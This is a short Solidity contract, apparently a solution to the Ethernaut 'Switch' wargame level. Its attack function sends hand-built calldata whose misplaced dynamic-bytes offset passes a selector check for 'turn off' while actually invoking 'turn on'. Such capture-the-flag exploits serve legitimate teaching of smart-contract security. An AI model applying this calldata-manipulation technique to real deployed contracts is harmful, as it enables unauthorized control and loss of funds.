// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "../contracts/29_Switch.sol";

contract SwitchAttacker {
    address private switchAddress;

    constructor(address _switchAddress) {
        switchAddress = _switchAddress;
    }

    function attack() external {
        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (bool success, ) = switchAddress.call(callData);

        if (!success) {
            revert();
        }
    }
}
